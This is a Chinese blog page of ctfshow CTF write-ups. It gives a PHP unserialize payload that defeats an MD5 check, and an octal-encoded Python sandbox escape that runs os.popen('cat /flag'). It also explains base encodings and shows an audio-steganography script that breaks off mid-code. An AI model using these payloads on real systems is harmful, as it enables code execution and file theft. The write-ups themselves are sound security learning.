@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">ctfshow的试炼</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-11-16</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-29</span>
+            
+            
+             <span style="margin: 0 15px;">|</span>
+             📂 刷题
+            
+        </div>
+        
+        <div class="article-content">
+            <p>ctfshow的做题之路，这边我会把我感觉对自己很有帮助的题目以及wp写出来。</p>
+<h1 id="1-签到·好玩的PHP"><a href="#1-签到·好玩的PHP" class="headerlink" title="#1.签到·好玩的PHP"></a>#1.签到·好玩的PHP</h1><p>这题目特别简洁但又难做，上代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">  class ctfshow &#123;</span><br><span class="line">    private $d = &#x27;&#x27;;</span><br><span class="line">    private $s = &#x27;&#x27;;</span><br><span class="line">    private $b = &#x27;&#x27;;</span><br><span class="line">    private $ctf = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function __destruct() &#123;</span><br><span class="line">​      $this-&gt;d = (string)$this-&gt;d;</span><br><span class="line">​      $this-&gt;s = (string)$this-&gt;s;</span><br><span class="line">​      $this-&gt;b = (string)$this-&gt;b;</span><br><span class="line"></span><br><span class="line">​      if (($this-&gt;d != $this-&gt;s) &amp;&amp; ($this-&gt;d != $this-&gt;b) &amp;&amp; ($this-&gt;s != $this-&gt;b)) &#123;</span><br><span class="line">​        $dsb = $this-&gt;d.$this-&gt;s.$this-&gt;b;</span><br><span class="line"></span><br><span class="line">​        if ((strlen($dsb) &lt;= 3) &amp;&amp; (strlen($this-&gt;ctf) &lt;= 3)) &#123;</span><br><span class="line">​          if (($dsb !== $this-&gt;ctf) &amp;&amp; ($this-&gt;ctf !== $dsb)) &#123;</span><br><span class="line">​            if (md5($dsb) === md5($this-&gt;ctf)) &#123;</span><br><span class="line">​              echo file_get_contents(&quot;/flag.txt&quot;);</span><br><span class="line">​            &#125;</span><br><span class="line">​          &#125;</span><br><span class="line">​        &#125;</span><br><span class="line">​      &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  unserialize($_GET[&quot;dsbctf&quot;]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>if (($this-&gt;d !&#x3D; $this-&gt;s) &amp;&amp; ($this-&gt;d !&#x3D; $this-&gt;b) &amp;&amp; ($this-&gt;s !&#x3D; $this-&gt;b))</strong></p>
+<p>(string)强制字符穿，弱比较三者，要求不等。</p>
+<p><strong>拼接 <code>$dsb = $this-&gt;d . $this-&gt;s . $this-&gt;b;</code></strong></p>
+<p><code>**if ((strlen($dsb) &lt;= 3) &amp;&amp; (strlen($this-&gt;ctf) &lt;= 3)) **</code></p>
+<p>$dsb字符长度不超过3，$ctf同理。</p>
+<p><strong>if (($dsb !&#x3D;&#x3D; $this-&gt;ctf) &amp;&amp; ($this-&gt;ctf !&#x3D;&#x3D; $dsb))</strong></p>
+<p>两者绝对不相等。</p>
+<p><strong>md5($dsb) &#x3D;&#x3D;&#x3D; md5($this-&gt;ctf)</strong></p>
+<p>然后两者的md5值要求一定等。</p>
+<p>代码大致含义如此，接下来想想怎么构造；</p>
+<p>如果强制转换字符后，$d&#x3D;1,$s&#x3D;2,$b&#x3D;3,组合后$dsb&#x3D;123,然后让$ctf&#x3D;整型类的123，两者相等，但一个字符，一个数字，比较不同，123也&lt;&#x3D;这样就满足了题意。</p>
+<p>可是又有一个unserialize()这个函数，它要求我们php序列化后才能执行我们的传参，即形式为 s:长度:”键名”; 值;。</p>
+<p>最后研究一下，得到了</p>
+<p><strong>O:7:”ctfshow”:4:{<br>  s:10:”\x00ctfshow\x00d”; s:1:”1”;<br>  s:10:”\x00ctfshow\x00s”; s:1:”2”;<br>  s:10:”\x00ctfshow\x00b”; s:1:”3”;<br>  s:12:”\x00ctfshow\x00ctf”; i:123;<br>}</strong></p>
+<p>然后url编码一下，<strong>O%3A7%3A”ctfshow”%3A4%3A%7Bs%3A10%3A”%00ctfshow%00d”%3Bs%3A1%3A”1”%3Bs%3A10%3A”%00ctfshow%00s”%3Bs%3A1%3A”2”%3Bs%3A10%3A”%00ctfshow%00b”%3Bs%3A1%3A”3”%3Bs%3A12%3A”%00ctfshow%00ctf”%3Bi%3A123%3B%7D</strong></p>
+<p>得到我们最后的传参值。</p>
+<p>传参后得到flag，ctfshow{e29728f4-86f4-49d0-bbd7-03c5e383f4e6}</p>
+<p>这一题的关键点在于序列化的过程，必须严格符合要求，否则一切都没用。</p>
+<hr>
+<h1 id="2-算力升级"><a href="#2-算力升级" class="headerlink" title="#2.算力升级"></a>#2.算力升级</h1><p>其实一开始我以为这题应该跟上一题的算力超群的难度差不多，只要看一下题目是怎么计算的，然后用指令读取flag，没想到还是卡了一段时间，此题出自菜狗杯的web题算力升级。</p>
+<p><img src="/images/QQ20251121-175940.png" alt="alt text"></p>
+<p><img src="/images/QQ20251121-180042.png" alt="alt text"></p>
+<ol>
+<li><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1. \# !/usr/bin/env python</span><br><span class="line">2. \# -*-coding:utf-8 -*-</span><br><span class="line">3. &quot;&quot;&quot;</span><br><span class="line">4. \# File       : app.py</span><br><span class="line">5. \# Time       ：2022/10/20 15:16</span><br><span class="line">6. \# Author     ：g4_simon</span><br><span class="line">7. \# version    ：python 3.9.7</span><br><span class="line">8. \# Description：算力升级--这其实是一个pyjail题目</span><br><span class="line">9. &quot;&quot;&quot;</span><br><span class="line">10. from flask import *</span><br><span class="line">11. import os</span><br><span class="line">12. import re,gmpy2 </span><br><span class="line">13. import json</span><br><span class="line">14. \#初始化全局变量</span><br><span class="line">15. app = Flask(__name__)</span><br><span class="line">16. pattern=re.compile(r&#x27;\w+&#x27;)</span><br><span class="line">17. @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">18. def index():  </span><br><span class="line">19. ​    return render_template(&#x27;index.html&#x27;)</span><br><span class="line">20. @app.route(&#x27;/tiesuanzi&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">21. def tiesuanzi():</span><br><span class="line">22. ​    code=request.form.get(&#x27;code&#x27;)</span><br><span class="line">23. ​    for item in pattern.findall(code):#从code里把单词拿出来</span><br><span class="line">24. ​        if not re.match(r&#x27;\d+$&#x27;,item):#如果不是数字</span><br><span class="line">25. ​            if item not in dir(gmpy2):#逐个和gmpy2库里的函数名比较</span><br><span class="line">26. ​               return jsonify(&#123;&quot;result&quot;:1,&quot;msg&quot;:f&quot;你想干什么？&#123;item&#125;不是有效的函数&quot;&#125;)</span><br><span class="line">27. ​    try:</span><br><span class="line">28. ​        result=eval(code)</span><br><span class="line">29. ​        return jsonify(&#123;&quot;result&quot;:0,&quot;msg&quot;:f&quot;计算成功，答案是&#123;result&#125;&quot;&#125;)</span><br><span class="line">30. ​    except:</span><br><span class="line">31. ​        return jsonify(&#123;&quot;result&quot;:1,&quot;msg&quot;:f&quot;没有执行成功，请检查你的输入。&quot;&#125;)</span><br><span class="line">32. @app.route(&#x27;/source&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">33. def source():  </span><br><span class="line">34. ​    return render_template(&#x27;source.html&#x27;)</span><br><span class="line">35. if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">36. ​    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=False)</span><br></pre></td></tr></table></figure>
+
+<p>题目有给它的源码，大致能看懂。</p>
+<p>如果取出的不是数字就判断是否为gmpy2库(高精度算术运算库)的函数名，如果最后都是就eval(code)代码执行.</p>
+<p>所以我们得去看gmpy2库里到底有什么，有什么是我们能用的。</p>
+<p>一番查询后，发现这里面没有什么能派得上用场的，基本都是数学公式类型的函数。</p>
+<p>这个时候只能看看<code>__builtins__</code>这个初始工具箱了。</p>
+<p><em>计算成功，答案是{‘<strong>name</strong>‘: ‘builtins’, ‘<strong>doc</strong>‘: “Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the <code>nil&#39; object; Ellipsis represents </code>…’ in slices.”, ‘<strong>package</strong>‘: ‘’, ‘<strong>loader</strong>‘: , ‘<strong>spec</strong>‘: ModuleSpec(name&#x3D;’builtins’, loader&#x3D;), ‘<strong>build_class</strong>‘: , ‘<strong>import</strong>‘: , ‘abs’: , ‘all’: , ‘any’: , ‘ascii’: , ‘bin’: , ‘breakpoint’: , ‘callable’: , ‘chr’: , ‘compile’: , ‘delattr’: , ‘dir’: , ‘divmod’: , ‘eval’: , ‘exec’: , ‘format’: , ‘getattr’: , ‘globals’: , ‘hasattr’: , ‘hash’: , ‘hex’: , ‘id’: , ‘input’: , ‘isinstance’: , ‘issubclass’: , ‘iter’: , ‘len’: , ‘locals’: , ‘max’: , ‘min’: , ‘next’: , ‘oct’: , ‘ord’: , ‘pow’: , ‘print’: , ‘repr’: , ‘round’: , ‘setattr’: , ‘sorted’: , ‘sum’: , ‘vars’: , ‘None’: None, ‘Ellipsis’: Ellipsis, ‘NotImplemented’: NotImplemented, ‘False’: False, ‘True’: True, ‘bool’: , ‘memoryview’: , ‘bytearray’: , ‘bytes’: , ‘classmethod’: , ‘complex’: , ‘dict’: , ‘enumerate’: , ‘filter’: , ‘float’: , ‘frozenset’: , ‘property’: , ‘int’: , ‘list’: , ‘map’: , ‘object’: , ‘range’: , ‘reversed’: , ‘set’: , ‘slice’: , ‘staticmethod’: , ‘str’: , ‘super’: , ‘tuple’: , ‘type’: , ‘zip’: , ‘<strong>debug</strong>‘: True, ‘BaseException’: , ‘Exception’: , ‘TypeError’: , ‘StopAsyncIteration’: , ‘StopIteration’: , ‘GeneratorExit’: , ‘SystemExit’: , ‘KeyboardInterrupt’: , ‘ImportError’: , ‘ModuleNotFoundError’: , ‘OSError’: , ‘EnvironmentError’: , ‘IOError’: , ‘EOFError’: , ‘RuntimeError’: , ‘RecursionError’: , ‘NotImplementedError’: , ‘NameError’: , ‘UnboundLocalError’: , ‘AttributeError’: , ‘SyntaxError’: , ‘IndentationError’: , ‘TabError’: , ‘LookupError’: , ‘IndexError’: , ‘KeyError’: , ‘ValueError’: , ‘UnicodeError’: , ‘UnicodeEncodeError’: , ‘UnicodeDecodeError’: , ‘UnicodeTranslateError’: , ‘AssertionError’: , ‘ArithmeticError’: , ‘FloatingPointError’: , ‘OverflowError’: , ‘ZeroDivisionError’: , ‘SystemError’: , ‘ReferenceError’: , ‘MemoryError’: , ‘BufferError’: , ‘Warning’: , ‘UserWarning’: , ‘DeprecationWarning’: , ‘PendingDeprecationWarning’: , ‘SyntaxWarning’: , ‘RuntimeWarning’: , ‘FutureWarning’: , ‘ImportWarning’: , ‘UnicodeWarning’: , ‘BytesWarning’: , ‘ResourceWarning’: , ‘ConnectionError’: , ‘BlockingIOError’: , ‘BrokenPipeError’: , ‘ChildProcessError’: , ‘ConnectionAbortedError’: , ‘ConnectionRefusedError’: , ‘ConnectionResetError’: , ‘FileExistsError’: , ‘FileNotFoundError’: , ‘IsADirectoryError’: , ‘NotADirectoryError’: , ‘InterruptedError’: , ‘PermissionError’: , ‘ProcessLookupError’: , ‘TimeoutError’: , ‘open’: , ‘quit’: Use quit() or Ctrl-D (i.e. EOF) to exit, ‘exit’: Use exit() or Ctrl-D (i.e. EOF) to exit, ‘copyright’: Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., ‘credits’: Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See <a target="_blank" rel="noopener" href="http://www.python.org/">www.python.org</a> for more information., ‘license’: Type license() to see the full license text, ‘help’: Type help() for interactive help, or help(object) for help about object.}</em></p>
+<p>通过这个计算机执行命令<code>gmpy2.__builtins__</code>看一下,一遍走马观花后发现了eval这个函数，那可太熟悉了，利用它构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这样一个指令，就可以读取目录下的flag文件，但是还有个问题，题目存在war，它对我们输入的东西进行拦截。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern=re.compile(r&#x27;\w+&#x27;)</span><br><span class="line"></span><br><span class="line">if item not in dir(gmpy2)</span><br></pre></td></tr></table></figure>
+
+<p>输入的必须是数字，字母，下划线，如果不是，就要跟gmpy2的函数进行比较。</p>
+<p>而eval在<code>gmpy2.__builtins__</code>里，而不是直接在gmpy2里的，所以我们只能使用拼接的方法，e v a l，找一下gmpy2中我们需要的。</p>
+<p>随便查一下，我选择使用exp，invert，frac，log，所以我们要这样**[‘exp’[0]+’invert’[2]+’frac’[2]+’log’[0]**]拼接出[‘eval’]。</p>
+<p>之后其实是可以纯拼接继续做的，但我以前看到过一个知识点，就是python是支持八进制转化的，就跟c语言asll码一样，所以正好，我们就可以用八进制来表示我们要的内容，具体转化方式上网查个表就能搞了，这边我就直接给出答案</p>
+<p><strong>\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51</strong></p>
+<p>组合得到最终的playload:</p>
+<p><code>*gmpy2.__builtins__[&#39;exp&#39;[0]+&#39;invert&#39;[2]+&#39;frac&#39;[2]+&#39;log&#39;[0]](&#39;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51&#39;)</code>*&#96;</p>
+<p>输入后得到flag <strong>ctfshow{c8b312c8-440d-475c-ab2d-b6b6c22bb749}</strong></p>
+<p>其实我nt了，其实eval也可以用八进制转化，只是当时我先想到的是拼接法，所以就没改了。</p>
+<p>总体无伤大雅。</p>
+<p>至于为什么不用16进制，我也不知道，问了ai，说是16进制有0x，会出问题，说不定以后就会遇到16进制转化的题目呢，学费了。</p>
+</li>
+</ol>
+<hr>
+<h1 id="3-base47"><a href="#3-base47" class="headerlink" title="#3.base47"></a>#3.base47</h1><p>   这题我应该写在神秘小笔记里的，但是想到这是ctfshow菜狗杯的密码题，还是写在这里了。</p>
+<p>   先看题目。</p>
+<p>   <img src="/images/QQ20251121-210922.png" alt="alt text"></p>
+<p>   神必字符： <code>E9CV^T+HT5#X36RF4@LAU703+F$E-0N$@68LMXCVDRJJD5@MP#7MUZDTE?WWLG1S#L@+^66H@59KTWYK8TW0RV</code></p>
+<p>   神必字典：0123456789ABCDEFGHJKLMNPQRSTUVWXYZ?!@#$%^&amp;*-+</p>
+<p>   其实咋一眼我要直接映射了，这底下给的太像映射的题目了。</p>
+<p>   不过看在base47，还是base解密吧。</p>
+<p>   但是有一个问题，base只有45没有47。</p>
+<p>   看了一下，底下的字典确实只有45个，缺少了I和O，估计这就是47的由来。</p>
+<p>   正常的我要贴代码和解密过程了，但这一题，对我来说，算是一题搞清楚base体系的过程，所以我倒不想这么写。</p>
+<p>   以前做题的时候并没有认真了解过base，所以基本都是直接丢工具与代码的，为了做题而使用。</p>
+<p>   不过在做这一题的时候，我突发奇想就去了解了base，因此有了这一篇文章。</p>
+<p>   一.base64</p>
+<p>   <strong>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;</strong>  这是base64所用到的字典，极少数情况下不一样。</p>
+<p>   正正好好64个，它的计算方式是将我们所输入的东西转化为二进制，以3个字节为一组，即24bit，然后平均的分成4组，每组6个bit，然后转化为十进制数字，对照base64表进行加密。</p>
+<p>   解密方式即为逆向，查看base64得到二进制数据，全部放在一起后，以八个为一组 ，计算ascll码，然后得到原文。</p>
+<p>   base64特别明显的特征是尾部会有&#x3D;&#x3D;或者&#x3D;，这是为了补足字节加的，base32也有这个情况。</p>
+<p>   二.base32</p>
+<p>   base32我其实是没见过体型的，这里也做了解一下。</p>
+<p>   <strong>ABCDEFGHIJKLMNOPQRSTUVWXYZ234567</strong> 这是它的字典，最明显的特征就是只有大写字母加数字。</p>
+<p>   同样的32个正正好好。</p>
+<p>   它则是将我们输入的东西转化二进制数据，以两个字节为一组，即16bit，然后5bit为一组，分成4组，最后一组不够补0.</p>
+<p>   得到四组数据后，查表得到加密后的数据。</p>
+<p>   解密的方式就是倒过来，具体的我就不描述了。</p>
+<p>   它的特征同样是尾部有&#x3D;，但它有时候可能会有很多个&#x3D;，目的同样是补齐。</p>
+<p>   三.base16</p>
+<p>   这个就不讲了，四位一组的16进制转化。</p>
+<p>   四.base58</p>
+<p>   这个挺有意思的，它是比特币负责人改良base64而来的，据说是为了防止转账时出现的失误。</p>
+<p>   它是先将我们输入的明文转为0x类型的16进制，再将数字组合，形成一个更大的16进制。eg：Hi  0x48和0x69,组合从成0x4869&#x3D;18537(十进制)。  然后将这个十进制数据除以58，取余数，不断重复，直到商为0，余数为本身，然后将得来的余数按早晚的顺序，晚的在前，早的在后，即先除来的余数是排在后面的，这样排列之后得到一串数字，再根据base58表，一个余数一个余数的对应得到密文。</p>
+<p>   它的字典是123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz。</p>
+<p>   对了，有一点要注意，base58规定了索引0为1，所以如果是数字5，那对应的就是6。</p>
+<p>   五.base85</p>
+<p>   base85会将我们输入的内容按4字节一组的分配，如果一组中只有一个字节，则在3其后补0.</p>
+<p>   它的计算方式和base58无不同，都是转16进制，组合，转回10进制。</p>
+<p>   然后除85取余数，然后倒序排列余数，对照映射表，base85的映射表是ASCII33(<code>!</code>)到117(<code>u</code>)。</p>
+<p>   即!”#$%&amp;’()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_&#96;abcdefghijklmnopqrstu。</p>
+<p>   然后得密文。</p>
+<p>   base体系还有其他的，这边我就不全介绍了。 </p>
+<hr>
+<h1 id="4-这个不好听"><a href="#4-这个不好听" class="headerlink" title="#4.这个不好听"></a>#4.这个不好听</h1><p>   这一题我是没做出来的，所以，这一篇的文章并非wp类型，算是记录我在认真学习官方wp的日记吧。</p>
+<p>   <img src="/images/QQ20251124-190629.png" alt="alt text"></p>
+<p>   题目给的附件是一个wav类型的音频。”C:\Users\G1731\Downloads\flag\flag.wav”</p>
+<p>   如题目而言听是不能听的，完全是没有任何信息的。</p>
+<p>   看到hint1，我第一印象居然是靶场的回归线方程，(捂脸)。</p>
+<p>   这个印象深的勒。</p>
+<p>   不说了，回到题目来。</p>
+<p>   <img src="/images/QQ20251124-191107.png" alt="alt text"></p>
+<p>   我一开始是先用随波逐流看一下，这个音频是不是有什么隐藏文件，或者16进制存在信息，但非常的遗憾，什么也没有。</p>
+<p>   这完全就是一个十分正常的音频，我又用010editor打开。</p>
+<p>   <img src="/images/QQ20251124-191340.png" alt="alt text"></p>
+<p>   <img src="/images/QQ20251124-191349.png" alt="alt text"></p>
+<p>   依旧是什么信息没有，这个时候呢，我还不觉得这个会让我没有思路。</p>
+<p>   我又想mp3隐写的工具看，但突然发现这个不是mp3文件啊，这个系列题目的上一题是MP3格式的，但这个不是。</p>
+<p>   所以肯定不能用了。</p>
+<p>   我又用wsl仔细看了看这个音频。</p>
+<p>   <strong>yu@localhost:&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;G1731$ file &#x2F;mnt&#x2F;c&#x2F;Users&#x2F;G1731&#x2F;flag.wav</strong><br>   <strong>&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;G1731&#x2F;flag.wav: RIFF (little-endian) data, WAVE audio, IEEE Float, mono 44100 Hz</strong></p>
+<p>   完全没有东西。</p>
+<p>   这个时候，我想，估计就是仔细看看音轨了。</p>
+<p>   audicity打开。</p>
+<p>   <img src="/images/QQ20251124-192635.png" alt="alt text"></p>
+<p>   哇！！！！真是一点信息都没有，我本身这个音频类型的misc题型遇到的就不多，而且misc在我看来，是一个极考验灵光咋现和题量的版块，它不像web或者pwn或者re，需要代码审计，函数理解之类的可以很直接查到的东西，如果直接搜音频隐写，那是真的大海捞针，但是一旦有了一个正确的思路，就可以直接顺着思路，秒杀misc，唉，完全不知道该怎么办了，要说不是文件隐藏，那万一它是个啥数据流的隐藏，我又找不到，要说音频没有其他信息，那它有，我也想不到，题目是怎么隐藏的。</p>
+<p>   <img src="/images/QQ20251124-193212.png" alt="alt text"></p>
+<p>   唯一我感觉有用的也就是这个，调整音频频率找到的跟三角函数很像的图像 ，这个也跟hint1的提醒有所关联。</p>
+<p>   但，怎么把这个轨道提取出来，放在能让我推算的画板上呢。</p>
+<p>   这也是一个问题。</p>
+<p>   思来想去，我是找不到方法解决的，本来想问学长的，想想看，还是自己想吧。</p>
+<p>   大概是几分钟后，我就决定还是看wp吧，这个是真不行，即便能提取出来，我稍微左右滑动了几下，这样的轨道有好多个，我要是能提取出来得到![QQ20251124-193812](C:\Users\G1731\Pictures\QQ20251124-193812.png信息就罢了，万一思路又是堵的，浪费时间也多，估计最后也是wp，那何不如早点wp。</p>
+<p>   所以我就去打开了官方wp。</p>
+<p>   <img src="/images/QQ20251124-193812.png" alt="alt text"></p>
+<p>   <img src="/images/QQ20251124-193822.png" alt="alt text"></p>
+<p>   <img src="/images/QQ20251124-193836.png" alt="alt text"></p>
+<p>   <img src="/images/QQ20251124-193845.png" alt="alt text"></p>
+<p>   <img src="/images/QQ20251124-193851.png" alt="alt text"></p>
+<p>   研究了快三天，我大致理解这是什么原理了。</p>
+<p>   这个音频每0.1s断开一次，一共是有8种不同的音频轨道，根据相位从小到大排列0-7.</p>
+<p>   然后一个一个的对应，将整个音频从头开始，0.1s 0.1s的分开，然后根据这个音频轨道是8种轨道的哪一个对应着记录下数字。</p>
+<p>   最后得到一串八进制数据，然后在转化成字符，最终得到flag。</p>
+<p>   原理有了，那要怎么复现呢， 真要手敲，我感觉就寄了，这完全就不是能实现的操作。</p>
+<p>   这个堪比当年做靶场黑与白的情况，那个300多张图片，手敲三次还是出了问题，这个还这么多，更不能手搓了。</p>
+<p>   官方的wp也只是提供了思路，并没有一个确切的做法。</p>
+<p>   所以我这边就在研究能不能用脚本来搞。</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import scipy.io.wavfile as wav</span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">1. 设置文件路径 (根据你的截图改好了)</span><br><span class="line"></span><br><span class="line">file_path = r&quot;C:\Users\G1731\flag.wav&quot;</span><br><span class="line"></span><br><span class="line">print(f&quot;📂 正在读取文件: &#123;file_path&#125;&quot;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line"> 使用 scipy 读取，Anaconda 默认自带这个库，绝对稳！</span><br><span class="line"></span><br><span class="line">​    sample_rate, data = wav.read(file_path)</span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line"> 如果是双声道，取左声道</span><br><span class="line"></span><br><span class="line">​    if len(data.shape) &gt; 1:</span><br><span class="line">​        data = data[:, 0]</span><br><span class="line">​        </span><br><span class="line">​    print(f&quot;✅ 读取成功！采样率: &#123;sample_rate&#125;&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">​    print(f&quot;❌ 读取失败: &#123;e&#125;&quot;)</span><br><span class="line">​    exit()</span><br><span class="line"></span><br><span class="line">2. 准备变量</span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line">step = sample_rate // 10  # 0.1秒切一段</span><br><span class="line"></span><br><span class="line">print(&quot;⚡️ 正在进行 FFT 相位分析...&quot;)</span><br><span class="line"></span><br><span class="line">3. 循环处理每一段</span><br><span class="line"></span><br><span class="line">for i in range(0, len(data), step):</span><br><span class="line">    window = data[i : i + step]</span><br><span class="line">    if len(window) &lt; step:</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line"> --- 核心算法 这步计算是 Excel 做不到的，必须用 fft</span><br><span class="line"></span><br><span class="line">​    fft_res = np.fft.fft(window)</span><br><span class="line"></span><br><span class="line">    取第25个频率点的相位</span><br><span class="line"></span><br><span class="line">​    v = np.angle(fft_res[25])</span><br><span class="line">​    </span><br><span class="line"></span><br><span class="line">    4. 根据相位分类 (Writeup 里的阈值)</span><br><span class="line"></span><br><span class="line">​    val = 7</span><br><span class="line"></span><br><span class="line">    这些是相位角的阈值，不是电压</span><br><span class="line"></span><br><span class="line">​    thresholds = [-2.5, -1.7, -0.7, 0, 0.7, 1.5, 2.4]</span><br><span class="line">​    </span><br><span class="line">​    for t in thresholds:</span><br><span class="line">​        if v &lt; t:</span><br><span class="line">​            val -= 1</span><br><span class="line">​    flag_list.append(val)</span><br><span class="line"></span><br><span class="line">5. 解码</span><br><span class="line"></span><br><span class="line">(j+4)%8 